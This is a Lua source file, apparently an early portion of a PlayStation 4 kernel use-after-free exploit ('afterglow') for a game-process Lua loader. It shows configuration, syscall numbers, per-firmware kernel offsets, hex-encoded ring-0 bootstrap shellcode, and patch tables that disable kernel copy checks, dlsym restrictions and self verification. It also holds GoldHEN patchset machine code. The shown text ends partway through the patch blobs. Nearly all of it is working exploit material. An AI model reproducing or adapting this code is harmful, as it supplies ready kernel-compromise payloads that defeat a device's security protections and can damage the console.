--[[
    afterglow.lua -- PS4 /dev/apm clone UaF kernel exploit for the
    remote_lua_loader host (game process, Lua 5.1).

    Derivative of well0nez/afterglow-web (AGPL-3.0), itself a port of the Lua
    original: kernel bug, reclaim, ring 0 bootstrap and handle teardown are
    shared with it. Same licence, same attribution.

    Host mapping:
        sc(n, ...)              -> syscall.resolve() + the loader's stubs
        callAddr(addr, args)    -> native.fcall
        p.read*/p.write*        -> memory.read_*/write_*
        mark(tag, msg)          -> print()

    Syscalls: open close ioctl mprotect socket setsockopt getuid kqueue kevent
    mmap getpid sysctl cpuset_getaffinity cpuset_setaffinity.

    THE CONSOLE CAN DIE FROM THIS. Read README.md before mode = "run".
]]
local AG = {}
_G.AG = AG
AG.version = "3.2-lua-clean"

-- probe: fires nothing and patches nothing. run: the exploit.
-- goldhen: installs a payload over 9020. gate/elf/listen: diagnostics
-- that reuse the gate a previous run left in the kernel.
AG.cfg = {
    mode = "probe",
    fw_override = nil,
    payload_path = nil,
    apply_patchset = true,
    tune = {
        sprays  = 126,
        object  = 104,
        window  = 0x1000,
        entries = 420,
        stride  = 0x90,
        seed    = 45,
        spare   = 8,
        ceiling = 63,
        spray_mode = "after",
        refill = 8,
        module_sweep = true,
    },
    probe_nodes = {
        "/dev/rng", "/dev/urandom", "/dev/random",
        "/dev/zero", "/dev/null", "/dev/apm",
    },
    verbose = true,
    debug = false,
    elf_test_path = "/av_contents/content_tmp/kx_selftest.elf",
    payload_b64 = nil,
    payload_name = nil,
    payload_len = nil,
    gate_off = 0xab4,
    patch_gate = false,
    listen_port = 9020,
    listen_max = 0x100000,
    gate_room = nil,
    gate_room_off = 0xE5000,
    measure_cores = true,
    notify = false,
    use_jmp_pivot = false,
    idle_first_shot = false,
    idle_only = false,
    leak_rax_only = false,
    probe_read = false,
    probe_memcpy_user = false,
    leak_aligned_only = false,
    one_read_only = false,
}

local TUNE = AG.cfg.tune

function AG.on_screen(msg)
    if not AG.cfg.notify then return end
    local ok = pcall(notify, "afterglow: " .. tostring(msg))
    if not ok then AG.cfg.notify = false end
end

local function log(fmt, ...)
    local line
    if select("#", ...) > 0 then
        line = string.format(fmt, ...)
    else
        line = tostring(fmt)
    end
    print("[AG] " .. line)
end

local function warn(fmt, ...)
    local line
    if select("#", ...) > 0 then
        line = string.format(fmt, ...)
    else
        line = tostring(fmt)
    end
    print("[AG] !! " .. line)
end

-- Addresses stay uint64 so kernel values keep their high half exactly.
local function U(v) return uint64(v) end
local function U64(l, h) return uint64({ l = l % 2^32, h = (h or 0) % 2^32 }) end
local function plus(a, n) return U(a) + U(n) end
local function qw(str, off) return uint64.unpack(str:sub(off + 1, off + 8)) end
local function same(a, b) return b ~= nil and a.l == b.l and a.h == b.h end
local function zero(a) return a == nil or (a.l == 0 and a.h == 0) end
local function in_text(a) return a ~= nil and a.h >= 0xffffff00 and a.l ~= 0 end
local function in_heap(a) return a ~= nil and a.h >= 0xffff0000 and a.h < 0xffffff00 and a.l ~= 0 end

local function hexaddr(a)
    if a == nil then return "nil" end
    return string.format("0x%08x%08x", a.h, a.l)
end

function AG.alloc(n) return memory.alloc(n) end
function AG.rdbuf(at, len) return memory.read_buffer(at, len) end
function AG.wrbuf(at, s) memory.write_buffer(at, s) end
function AG.wr1(at, b) memory.write_byte(at, b) end
function AG.wr4(at, n) memory.write_dword(at, n) end
function AG.wr8(at, q) memory.write_qword(at, uint64(q)) end
function AG.zero(at, n) memory.write_buffer(at, string.rep("\0", n)) end

function AG.rd1(at) return memory.read_byte(at):tonumber() end
function AG.rd4(at) return memory.read_dword(at):tonumber() end
function AG.rd8(at) return memory.read_qword(at) end

local function now_ms() return os.clock() * 1000 end

AG.S = {
    open               = 5,
    close              = 6,
    getpid             = 20,
    getuid             = 24,
    ioctl              = 54,
    mprotect           = 74,
    socket             = 97,
    setsockopt         = 105,
    kqueue             = 362,
    kevent             = 363,
    mmap               = 477,
    cpuset_getaffinity = 487,
    cpuset_setaffinity = 488,
}

AG.have = {}

function AG.resolve_syscalls()
    local missing = {}
    for name, num in pairs(AG.S) do
        local ok = pcall(syscall.resolve, { [name] = num })
        AG.have[name] = ok and syscall[name] ~= nil
        if not AG.have[name] then
            table.insert(missing, string.format("%s(%d)", name, num))
        end
    end
    table.sort(missing)
    return missing
end

local function i32(r)
    if r == nil then return -1 end
    return r:tonumber()
end

local function errno_str()
    local ok, s = pcall(get_error_string)
    if ok and s then return s end
    return "?"
end

local function call(target, a1, a2, a3, a4, a5, a6)
    return native.fcall(target, a1 or 0, a2 or 0, a3 or 0, a4 or 0, a5 or 0, a6 or 0)
end
AG.call = call

-- Kernel image offsets
local FIRMWARE = {
    ["14.02"] = {
        anchor    = 0x00e6c30,
        swap_rbp  = 0x0a81478,
        prison0   = 0x111fa18,
        rootvnode = 0x2136e90,
        padding   = 0x0b3a298,
        ghKmem    = 0x0466920,
    },
    ["14.00"] = {
        anchor    = 0x00e6c60,
        swap_rbp  = 0x0a80f68,
        prison0   = 0x111fa18,
        rootvnode = 0x2136e90,
        padding   = 0x0b39d98,
        ghKmem    = 0x0466540,
    },
    ["13.52"] = {
        anchor    = 0x00e6c60,
        swap_rbp  = 0x0a80c98,
        prison0   = 0x111fa18,
        rootvnode = 0x2136e90,
        padding   = 0x0b39ad8,
        ghKmem    = 0x0466290,
    },
    ["13.50"] = {
        anchor    = 0x00e6c20,
        swap_rbp  = 0x0a80838,
        prison0   = 0x111fa18,
        rootvnode = 0x2136e90,
        padding   = 0x0b39658,
        ghKmem    = 0x0465e90,
    },
    ["13.04"] = {
        anchor    = 0x00e6c20,
        swap_rbp  = 0x0a803c8,
        prison0   = 0x111fa18,
        rootvnode = 0x2136e90,
        padding   = 0x0b39218,
        ghKmem    = 0x0465a50,
    },
    ["13.02"] = {
        anchor    = 0x00e6c20,
        swap_rbp  = 0x0a803c8,
        prison0   = 0x111fa18,
        rootvnode = 0x2136e90,
        padding   = 0x0b39218,
        ghKmem    = 0x0465a50,
    },
    ["13.00"] = {
        anchor    = 0x00e6c20,
        swap_rbp  = 0x0a803c8,
        prison0   = 0x111fa18,
        rootvnode = 0x2136e90,
        padding   = 0x0b39218,
        ghKmem    = 0x0465a40,
    },
    ["12.52"] = {
        anchor    = 0x00e6c20,
        swap_rbp  = 0x0a80248,
        prison0   = 0x111fa18,
        rootvnode = 0x2136e90,
        padding   = 0x0b39098,
        ghKmem    = 0x0465a20,
    },
    ["12.50"] = {
        anchor    = 0x00e6c20,
        swap_rbp  = 0x0a80248,
        prison0   = 0x111fa18,
        rootvnode = 0x2136e90,
        padding   = 0x0b39098,
        ghKmem    = 0x0465a20,
    },
    ["12.02"] = {
        anchor    = 0x00e6c20,
        swap_rbp  = 0x0a80188,
        prison0   = 0x111fa18,
        rootvnode = 0x2136e90,
        padding   = 0x0b38fd8,
        ghKmem    = 0x04659e0,
    },
    ["12.00"] = {
        anchor    = 0x00e6c20,
        swap_rbp  = 0x0a80188,
        prison0   = 0x111fa18,
        rootvnode = 0x2136e90,
        padding   = 0x0b38fd8,
        ghKmem    = 0x04659e0,
    },
}

-- The bootstrap carries kernel addresses inside its machine code, so it
-- is one blob per firmware: 142 bytes, then the gate goes behind it.
local BOOTSTRAP_TABLE = {
    ["14.02"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
          .. "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
          .. "488991882d1001c781ac2d100101000000c681daae1f0037c681ddae1f00370f"
          .. "20c0480d000001000f22c031c0c3",
    ["14.00"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
          .. "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
          .. "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
          .. "20c0480d000001000f22c031c0c3",
    ["13.52"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
          .. "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
          .. "488991882d1001c781ac2d100101000000c6813aa81f0037c6813da81f00370f"
          .. "20c0480d000001000f22c031c0c3",
    ["13.50"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
          .. "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
          .. "488991882d1001c781ac2d100101000000c6819aa71f0037c6819da71f00370f"
          .. "20c0480d000001000f22c031c0c3",
    ["13.04"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
          .. "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
          .. "488991882d1001c781ac2d100101000000c6818aa71f0037c6818da71f00370f"
          .. "20c0480d000001000f22c031c0c3",
    ["13.02"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
          .. "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
          .. "488991882d1001c781ac2d100101000000c6818aa71f0037c6818da71f00370f"
          .. "20c0480d000001000f22c031c0c3",
    ["13.00"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
          .. "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
          .. "488991882d1001c781ac2d100101000000c6817aa71f0037c6817da71f00370f"
          .. "20c0480d000001000f22c031c0c3",
    ["12.52"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
          .. "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
          .. "488991882d1001c781ac2d100101000000c6815aa71f0037c6815da71f00370f"
          .. "20c0480d000001000f22c031c0c3",
    ["12.50"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
          .. "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
          .. "488991882d1001c781ac2d100101000000c6815aa71f0037c6815da71f00370f"
          .. "20c0480d000001000f22c031c0c3",
    ["12.02"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
          .. "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
          .. "488991882d1001c781ac2d100101000000c6811aa71f0037c6811da71f00370f"
          .. "20c0480d000001000f22c031c0c3",
    ["12.00"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
          .. "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
          .. "488991882d1001c781ac2d100101000000c6811aa71f0037c6811da71f00370f"
          .. "20c0480d000001000f22c031c0c3",
}

function AG.supported_fws()
    local list = {}
    for fw in pairs(FIRMWARE) do list[#list + 1] = fw end
    table.sort(list, function(a, b)
        local amajor, aminor = a:match("^(%d+)%.(%d+)$")
        local bmajor, bminor = b:match("^(%d+)%.(%d+)$")
        if amajor == bmajor then return tonumber(aminor) > tonumber(bminor) end
        return tonumber(amajor) > tonumber(bmajor)
    end)
    return list
end

-- Kernel patch pass, applied through the gate in a single entry.
local PATCH_TABLE = {
    ["14.02"] = {
        { 0x0000acd, "eb", "bcopy" },
        { 0x02bda9d, "eb", "bzero" },
        { 0x02bdae1, "eb", "pagezero" },
        { 0x02bdb5d, "eb", "memcpy" },
        { 0x02bdba1, "eb", "pagecopy" },
        { 0x02bdd4d, "eb", "copyin" },
        { 0x02be1fd, "eb", "copyinstr" },
        { 0x02be2cd, "eb", "copystr" },
        { 0x01b7c63, "eb04", "dlsym, first check" },
        { 0x01b7c73, "eb04", "dlsym, second check" },
        { 0x01b7c93, "90e9", "dlsym, nop and jump" },
        { 0x01b7724, "90e9", "load_prx" },
        { 0x01b7cd8, "90e93c01", "dlsym, open it to every caller" },
        { 0x0628b04, "eb00", "self verification" },
        { 0x06293ef, "eb00", "delayed panic on suspend" },
    },
    ["14.00"] = {
        { 0x0000acd, "eb", "bcopy" },
        { 0x02bd79d, "eb", "bzero" },
        { 0x02bd7e1, "eb", "pagezero" },
        { 0x02bd85d, "eb", "memcpy" },
        { 0x02bd8a1, "eb", "pagecopy" },
        { 0x02bda4d, "eb", "copyin" },
        { 0x02bdefd, "eb", "copyinstr" },
        { 0x02bdfcd, "eb", "copystr" },
        { 0x01b7a43, "eb04", "dlsym, first check" },
        { 0x01b7a53, "eb04", "dlsym, second check" },
        { 0x01b7a73, "90e9", "dlsym, nop and jump" },
        { 0x01b7504, "90e9", "load_prx" },
        { 0x01b7ab8, "90e93c01", "dlsym, open it to every caller" },
        { 0x0628684, "eb00", "self verification" },
        { 0x0628f6f, "eb00", "delayed panic on suspend" },
    },
    ["13.52"] = {
        { 0x0000acd, "eb", "bcopy" },
        { 0x02bd4ed, "eb", "bzero" },
        { 0x02bd531, "eb", "pagezero" },
        { 0x02bd5ad, "eb", "memcpy" },
        { 0x02bd5f1, "eb", "pagecopy" },
        { 0x02bd79d, "eb", "copyin" },
        { 0x02bdc4d, "eb", "copyinstr" },
        { 0x02bdd1d, "eb", "copystr" },
        { 0x01b77a3, "eb04", "dlsym, first check" },
        { 0x01b77b3, "eb04", "dlsym, second check" },
        { 0x01b77d3, "90e9", "dlsym, nop and jump" },
        { 0x01b7264, "90e9", "load_prx" },
        { 0x01b7818, "90e93c01", "dlsym, open it to every caller" },
        { 0x06283c4, "eb00", "self verification" },
        { 0x0628caf, "eb00", "delayed panic on suspend" },
    },
    ["13.50"] = {
        { 0x0000acd, "eb", "bcopy" },
        { 0x02bd44d, "eb", "bzero" },
        { 0x02bd491, "eb", "pagezero" },
        { 0x02bd50d, "eb", "memcpy" },
        { 0x02bd551, "eb", "pagecopy" },
        { 0x02bd6fd, "eb", "copyin" },
        { 0x02bdbad, "eb", "copyinstr" },
        { 0x02bdc7d, "eb", "copystr" },
        { 0x01b7703, "eb04", "dlsym, first check" },
        { 0x01b7713, "eb04", "dlsym, second check" },
        { 0x01b7733, "90e9", "dlsym, nop and jump" },
        { 0x01b71c4, "90e9", "load_prx" },
        { 0x01b7778, "90e93c01", "dlsym, open it to every caller" },
        { 0x0627fc4, "eb00", "self verification" },
        { 0x06288af, "eb00", "delayed panic on suspend" },
    },
    ["13.04"] = {
        { 0x0000acd, "eb", "bcopy" },
        { 0x02bd43d, "eb", "bzero" },
        { 0x02bd481, "eb", "pagezero" },
        { 0x02bd4fd, "eb", "memcpy" },
        { 0x02bd541, "eb", "pagecopy" },
        { 0x02bd6ed, "eb", "copyin" },
        { 0x02bdb9d, "eb", "copyinstr" },
        { 0x02bdc6d, "eb", "copystr" },
        { 0x01b76f3, "eb04", "dlsym, first check" },
        { 0x01b7703, "eb04", "dlsym, second check" },
        { 0x01b7723, "90e9", "dlsym, nop and jump" },
        { 0x01b71b4, "90e9", "load_prx" },
        { 0x01b7768, "90e93c01", "dlsym, open it to every caller" },
        { 0x0627b84, "eb00", "self verification" },
        { 0x062846f, "eb00", "delayed panic on suspend" },
    },
    ["13.02"] = {
        { 0x0000acd, "eb", "bcopy" },
        { 0x02bd43d, "eb", "bzero" },
        { 0x02bd481, "eb", "pagezero" },
        { 0x02bd4fd, "eb", "memcpy" },
        { 0x02bd541, "eb", "pagecopy" },
        { 0x02bd6ed, "eb", "copyin" },
        { 0x02bdb9d, "eb", "copyinstr" },
        { 0x02bdc6d, "eb", "copystr" },
        { 0x01b76f3, "eb04", "dlsym, first check" },
        { 0x01b7703, "eb04", "dlsym, second check" },
        { 0x01b7723, "90e9", "dlsym, nop and jump" },
        { 0x01b71b4, "90e9", "load_prx" },
        { 0x01b7768, "90e93c01", "dlsym, open it to every caller" },
        { 0x0627b84, "eb00", "self verification" },
        { 0x062846f, "eb00", "delayed panic on suspend" },
    },
    ["13.00"] = {
        { 0x0000acd, "eb", "bcopy" },
        { 0x02bd42d, "eb", "bzero" },
        { 0x02bd471, "eb", "pagezero" },
        { 0x02bd4ed, "eb", "memcpy" },
        { 0x02bd531, "eb", "pagecopy" },
        { 0x02bd6dd, "eb", "copyin" },
        { 0x02bdb8d, "eb", "copyinstr" },
        { 0x02bdc5d, "eb", "copystr" },
        { 0x01b76e3, "eb04", "dlsym, first check" },
        { 0x01b76f3, "eb04", "dlsym, second check" },
        { 0x01b7713, "90e9", "dlsym, nop and jump" },
        { 0x01b71a4, "90e9", "load_prx" },
        { 0x01b7758, "90e93c01", "dlsym, open it to every caller" },
        { 0x0627b84, "eb00", "self verification" },
        { 0x062846f, "eb00", "delayed panic on suspend" },
    },
    ["12.52"] = {
        { 0x0000acd, "eb", "bcopy" },
        { 0x02bd40d, "eb", "bzero" },
        { 0x02bd451, "eb", "pagezero" },
        { 0x02bd4cd, "eb", "memcpy" },
        { 0x02bd511, "eb", "pagecopy" },
        { 0x02bd6bd, "eb", "copyin" },
        { 0x02bdb6d, "eb", "copyinstr" },
        { 0x02bdc3d, "eb", "copystr" },
        { 0x01b76e3, "eb04", "dlsym, first check" },
        { 0x01b76f3, "eb04", "dlsym, second check" },
        { 0x01b7713, "90e9", "dlsym, nop and jump" },
        { 0x01b71a4, "90e9", "load_prx" },
        { 0x01b7758, "90e93c01", "dlsym, open it to every caller" },
        { 0x0627b34, "eb00", "self verification" },
        { 0x062841f, "eb00", "delayed panic on suspend" },
    },
    ["12.50"] = {
        { 0x0000acd, "eb", "bcopy" },
        { 0x02bd40d, "eb", "bzero" },
        { 0x02bd451, "eb", "pagezero" },
        { 0x02bd4cd, "eb", "memcpy" },
        { 0x02bd511, "eb", "pagecopy" },
        { 0x02bd6bd, "eb", "copyin" },
        { 0x02bdb6d, "eb", "copyinstr" },
        { 0x02bdc3d, "eb", "copystr" },
        { 0x01b76e3, "eb04", "dlsym, first check" },
        { 0x01b76f3, "eb04", "dlsym, second check" },
        { 0x01b7713, "90e9", "dlsym, nop and jump" },
        { 0x01b71a4, "90e9", "load_prx" },
        { 0x01b7758, "90e93c01", "dlsym, open it to every caller" },
        { 0x0627b34, "eb00", "self verification" },
        { 0x062841f, "eb00", "delayed panic on suspend" },
    },
    ["12.02"] = {
        { 0x0000acd, "eb", "bcopy" },
        { 0x02bd3cd, "eb", "bzero" },
        { 0x02bd411, "eb", "pagezero" },
        { 0x02bd48d, "eb", "memcpy" },
        { 0x02bd4d1, "eb", "pagecopy" },
        { 0x02bd67d, "eb", "copyin" },
        { 0x02bdb2d, "eb", "copyinstr" },
        { 0x02bdbfd, "eb", "copystr" },
        { 0x01b76a3, "eb04", "dlsym, first check" },
        { 0x01b76b3, "eb04", "dlsym, second check" },
        { 0x01b76d3, "90e9", "dlsym, nop and jump" },
        { 0x01b7164, "90e9", "load_prx" },
        { 0x01b7718, "90e93c01", "dlsym, open it to every caller" },
        { 0x0627af4, "eb00", "self verification" },
        { 0x06283df, "eb00", "delayed panic on suspend" },
    },
    ["12.00"] = {
        { 0x0000acd, "eb", "bcopy" },
        { 0x02bd3cd, "eb", "bzero" },
        { 0x02bd411, "eb", "pagezero" },
        { 0x02bd48d, "eb", "memcpy" },
        { 0x02bd4d1, "eb", "pagecopy" },
        { 0x02bd67d, "eb", "copyin" },
        { 0x02bdb2d, "eb", "copyinstr" },
        { 0x02bdbfd, "eb", "copystr" },
        { 0x01b76a3, "eb04", "dlsym, first check" },
        { 0x01b76b3, "eb04", "dlsym, second check" },
        { 0x01b76d3, "90e9", "dlsym, nop and jump" },
        { 0x01b7164, "90e9", "load_prx" },
        { 0x01b7718, "90e93c01", "dlsym, open it to every caller" },
        { 0x0627af4, "eb00", "self verification" },
        { 0x06283df, "eb00", "delayed panic on suspend" },
    },
}

-- GoldHEN's own patch set: the sites afterglow does not write itself.
-- Position independent, ends in ret, run through the gate.
local PATCHSET_HEX = {
    ["14.02"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981637c1b00b8"
          .. "eb04000041b9eb00000041baeb000000668981bcce2f0041bbeb000000b890e9"
          .. "ffff66c781b40a0000ff264881c2f40800006689b1737c1b006689b9937c1b00"
          .. "66448981048b6200c681cd0a0000ebc6819dda2b00ebc681e1da2b00ebc6815d"
          .. "db2b00ebc681a1db2b00ebc6814ddd2b00ebc681fde12b00ebc681cde22b00eb"
          .. "66448989ef936200c7819004000000000000c681c2040000eb66448991b90400"
          .. "0066448999b5040000c68136233900eb66898124771b00c781d87c1b0090e93c"
          .. "01c78190e73b004831c0c3c681daae1f0037c681ddae1f0037c781802d100102"
          .. "000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c0"
          .. "0f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be050000"
          .. "00668981a1571200b8eb060000bf05000000668981e357120041ba0100000048"
          .. "b84183bfa00400000041bb01000000488981eb571200b804000000668981fd57"
          .. "1200b8498bffffc781f9571200498b87d0c681ff57120000c78106581200498b"
          .. "b7b06689910a581200c6810c58120000c7811e581200498b87406689b1225812"
          .. "00c6812458120000c7812b581200498bb7206689b92f581200c6813158120000"
          .. "c78143581200498dbfc06644898147581200c6814958120000c7814f58120049"
          .. "8dbfe06644898953581200c6815558120000c78162581200498dbf0066448991"
          .. "66581200c6816858120000c7816e581200498dbf206644899972581200c68174"
          .. "581200006689817f581200c68181581200ff0f20c0480d000001000f22c031c0"
          .. "c3",
    ["14.00"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981437a1b00b8"
          .. "eb04000041b9eb00000041baeb0000006689815ccb2f0041bbeb000000b890e9"
          .. "ffff66c781b40a0000ff264881c2f40800006689b1537a1b006689b9737a1b00"
          .. "6644898184866200c681cd0a0000ebc6819dd72b00ebc681e1d72b00ebc6815d"
          .. "d82b00ebc681a1d82b00ebc6814dda2b00ebc681fdde2b00ebc681cddf2b00eb"
          .. "664489896f8f6200c7819004000000000000c681c2040000eb66448991b90400"
          .. "0066448999b5040000c681c61f3900eb66898104751b00c781b87a1b0090e93c"
          .. "01c781c0e33b004831c0c3c681daaa1f0037c681ddaa1f0037c781802d100102"
          .. "000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c0"
          .. "0f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be050000"
          .. "0066898191571200b8eb060000bf05000000668981d357120041ba0100000048"
          .. "b84183bfa00400000041bb01000000488981db571200b804000000668981ed57"
          .. "1200b8498bffffc781e9571200498b87d0c681ef57120000c781f6571200498b"
          .. "b7b0668991fa571200c681fc57120000c7810e581200498b87406689b1125812"
          .. "00c6811458120000c7811b581200498bb7206689b91f581200c6812158120000"
          .. "c78133581200498dbfc06644898137581200c6813958120000c7813f58120049"
          .. "8dbfe06644898943581200c6814558120000c78152581200498dbf0066448991"
          .. "56581200c6815858120000c7815e581200498dbf206644899962581200c68164"
          .. "581200006689816f581200c68171581200ff0f20c0480d000001000f22c031c0"
          .. "c3",
    ["13.52"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3771b00b8"
          .. "eb04000041b9eb00000041baeb000000668981acc82f0041bbeb000000b890e9"
          .. "ffff4881c210d504006689b1b3771b006689b9d3771b0066448981c4836200c6"
          .. "81cd0a0000ebc681edd42b00ebc68131d52b00ebc681add52b00ebc681f1d52b"
          .. "00ebc6819dd72b00ebc6814ddc2b00ebc6811ddd2b00eb66448989af8c6200c7"
          .. "819004000000000000c681c2040000eb66448991b904000066448999b5040000"
          .. "c681161d3900eb66898164721b00c78118781b0090e93c01c78110e13b004831"
          .. "c0c3c6813aa81f0037c6813da81f0037c781802d100102000000488991882d10"
          .. "01c781ac2d1001010000000f20c0480d000001000f22c00f20c04825fffffeff"
          .. "0f22c0b8eb480000ba040000004531c04531c9be0500000066898131561200b8"
          .. "eb060000bf050000006689817356120041ba0100000048b84183bfa004000000"
          .. "41bb010000004889817b561200b8040000006689818d561200b8498bffffc781"
          .. "89561200498b87d0c6818f56120000c78196561200498bb7b06689919a561200"
          .. "c6819c56120000c781ae561200498b87406689b1b2561200c681b456120000c7"
          .. "81bb561200498bb7206689b9bf561200c681c156120000c781d3561200498dbf"
          .. "c066448981d7561200c681d956120000c781df561200498dbfe066448989e356"
          .. "1200c681e556120000c781f2561200498dbf0066448991f6561200c681f85612"
          .. "0000c781fe561200498dbf206644899902571200c68104571200006689810f57"
          .. "1200c68111571200ff0f20c0480d000001000f22c031c0c3",
    ["13.50"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0b8eb040000beeb040000bf90e9ffff41b8eb00000066898103771b00b8"
          .. "eb04000041b9eb00000041baeb000000668981acc42f0041bbeb000000b890e9"
          .. "ffff9090909090909090904881c2f40800006689b113771b006689b933771b00"
          .. "66448981c47f6200c681cd0a0000ebc6814dd42b00ebc68191d42b00ebc6810d"
          .. "d52b00ebc68151d52b00ebc681fdd62b00ebc681addb2b00ebc6817ddc2b00eb"
          .. "66448989af886200c7819004000000000000c681c2040000eb66448991b90400"
          .. "0066448999b5040000c68116193900eb668981c4711b00c78178771b0090e93c"
          .. "01c78110dd3b004831c0c3c6819aa71f0037c6819da71f0037c781802d100102"
          .. "000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c0"
          .. "0f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be050000"
          .. "0066898191551200b8eb060000bf05000000668981d355120041ba0100000048"
          .. "b84183bfa00400000041bb01000000488981db551200b804000000668981ed55"
          .. "1200b8498bffffc781e9551200498b87d0c681ef55120000c781f6551200498b"
          .. "b7b0668991fa551200c681fc55120000c7810e561200498b87406689b1125612"
          .. "00c6811456120000c7811b561200498bb7206689b91f561200c6812156120000"
          .. "c78133561200498dbfc06644898137561200c6813956120000c7813f56120049"
          .. "8dbfe06644898943561200c6814556120000c78152561200498dbf0066448991"
          .. "56561200c6815856120000c7815e561200498dbf206644899962561200c68164"
          .. "561200006689816f561200c68171561200ff0f20c0480d000001000f22c031c0"
          .. "c3",
    ["13.04"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981f3761b00b8"
          .. "eb04000041b9eb00000041baeb0000006689815cc12f0041bbeb000000b890e9"
          .. "ffff9090909090909090904881c2f40800006689b103771b006689b923771b00"
          .. "66448981847b6200c681cd0a0000ebc6813dd42b00ebc68181d42b00ebc681fd"
          .. "d42b00ebc68141d52b00ebc681edd62b00ebc6819ddb2b00ebc6816ddc2b00eb"
          .. "664489896f846200c7819004000000000000c681c2040000eb66448991b90400"
          .. "0066448999b5040000c68156153900eb668981b4711b00c78168771b0090e93c"
          .. "01c781d0d83b004831c0c3c6818aa71f0037c6818da71f0037c781802d100102"
          .. "000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c0"
          .. "0f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be050000"
          .. "0066898191551200b8eb060000bf05000000668981d355120041ba0100000048"
          .. "b84183bfa00400000041bb01000000488981db551200b804000000668981ed55"
          .. "1200b8498bffffc781e9551200498b87d0c681ef55120000c781f6551200498b"
          .. "b7b0668991fa551200c681fc55120000c7810e561200498b87406689b1125612"
          .. "00c6811456120000c7811b561200498bb7206689b91f561200c6812156120000"
          .. "c78133561200498dbfc06644898137561200c6813956120000c7813f56120049"
          .. "8dbfe06644898943561200c6814556120000c78152561200498dbf0066448991"
          .. "56561200c6815856120000c7815e561200498dbf206644899962561200c68164"
          .. "561200006689816f561200c68171561200ff0f20c0480d000001000f22c031c0"
          .. "c3",
    ["13.02"] =
          "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
          .. "0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981f3761b00b8"
          .. "eb04000041b9eb00000041baeb0000006689815cc12f0041bbeb000000b890e9"
          .. "ffff9090909090909090904881c2f40800006689b103771b006689b923771b00"
          .. "66448981847b6200c681cd0a0000ebc6813dd42b00ebc68181d42b00ebc681fd"
          .. "d42b00ebc68141d52b00ebc681edd62b00ebc6819ddb2b00ebc6816ddc2b00eb"
          .. "664489896f846200c7819004000000000000c681c2040000eb66448991b90400"
          .. "0066448999b5040000c68156153900eb668981b4711b00c78168771b0090e93c"
          .. "01c781d0d83b004831c0c3c6818aa71f0037c6818da71f0037c781802d100102"
          .. "000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c0"
          .. "0f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be050000"
          .. "0066898191551200b8eb060000bf05000000668981d355120041ba0100000048"
          .. "b84183bfa00400000041bb01000000488981db551200b804000000668981ed55"
          .. "1200b8498bffffc781e9551200498b87d0c681ef55120000c781f6551200498b"
          .. "b7b0668991fa551200c681fc55120000c7810e561200498b87406689b1125612"
